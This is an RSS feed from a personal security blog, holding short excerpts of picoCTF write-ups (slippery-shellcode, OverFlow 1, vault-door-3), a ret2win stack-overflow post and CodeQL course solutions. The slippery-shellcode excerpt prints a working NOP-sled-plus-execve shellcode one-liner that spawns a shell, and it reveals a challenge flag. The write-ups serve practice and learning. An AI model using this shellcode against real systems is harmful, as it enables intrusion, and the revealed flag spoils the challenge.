<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Danil Delegator&#39;s Blog</title>
    <link>https://danildelegator.github.io/</link>
    <description>Recent content on Danil Delegator&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Fri, 17 Apr 2020 12:43:50 +0300</lastBuildDate>
    
	<atom:link href="https://danildelegator.github.io/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Day2 - Pico part 2</title>
      <link>https://danildelegator.github.io/day2/</link>
      <pubDate>Fri, 17 Apr 2020 12:43:50 +0300</pubDate>
      
      <guid>https://danildelegator.github.io/day2/</guid>
      <description>slippery-shellcode (200p) From the source code I can see that the shellcode is executed from a random point in the payload between 0 and 256 so the payload should contain a bunch of NOP instructions before the actual shellcode.
(python -c &amp;#39;print(&amp;#34;\x90&amp;#34;*300 + &amp;#34;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&amp;#34;)&amp;#39;; cat) | ./vuln The cat trick is so that I can use the shell I just popped.
cat the flag: picoCTF{sl1pp3ry_sh311c0d3_ecc37b22}
vault-door-3 (200p) buffer = list(&amp;#34;jU5t_a_sna_3lpm11ga4e_u_4_m9rf48&amp;#34;) password = list(&amp;#34;?</description>
    </item>
    
    <item>
      <title>Day1 - Pico part 1</title>
      <link>https://danildelegator.github.io/day1/</link>
      <pubDate>Thu, 16 Apr 2020 11:45:06 +0300</pubDate>
      
      <guid>https://danildelegator.github.io/day1/</guid>
      <description>After solving all the 50 and 100 challenges I decided it&amp;rsquo;s not worth posting them. So for the next few days I&amp;rsquo;ll hopefully post all &amp;gt;100 points challenges.
OverFlow 1 (150p) Run checksec on the file - no aslr. This means all the addresses are the same as they are in ida. In ida we find the function flag that prints out the flag @ 0x080485E6.
Also the checksec shows there are no stack canaries I we can easily overwrite the return address on the stack using the stack buffer overflow.</description>
    </item>
    
    <item>
      <title>Day0 - Ret2Win</title>
      <link>https://danildelegator.github.io/day0/</link>
      <pubDate>Wed, 15 Apr 2020 11:45:03 +0300</pubDate>
      
      <guid>https://danildelegator.github.io/day0/</guid>
      <description>Day 0 Recently I encountered this post series by @int0x33 and felt inspired to do something similar. So i&amp;rsquo;ve decided to post something new I learn or did every day for the next 100 days.
So lets start from the first challenge @int0x33 did.
First after running the binary we see it has a stack overflow. we confirm it by running: python3 -c &amp;quot;print(&#39;A&#39;*40 + &#39;B&#39;*4)&amp;quot; | ./ret2win.
If we do not know the offset of the ret address we can use gef&amp;rsquo;s pattern create and pattern offset features.</description>
    </item>
    
    <item>
      <title>GithubCourseCodeQLU Boot</title>
      <link>https://danildelegator.github.io/codeqlbootu/</link>
      <pubDate>Sat, 11 Apr 2020 19:04:44 +0300</pubDate>
      
      <guid>https://danildelegator.github.io/codeqlbootu/</guid>
      <description>GitHub Course CodeQL U-Boot Those are my solutions to GitHub Course CodeQL U-Boot, posting them here because I felt like they are going to be good as a cheat sheet.
Solutions  Get all function definitions with the name strlen
import cpp from Function f where f.getName() = &amp;#34;strlen&amp;#34; select f, &amp;#34;a fucntion named strlen&amp;#34;  Get all the macro definitions with a regex ntohs|ntohl|ntohll
import cpp from Macro m where m.</description>
    </item>
    
  </channel>
</rss>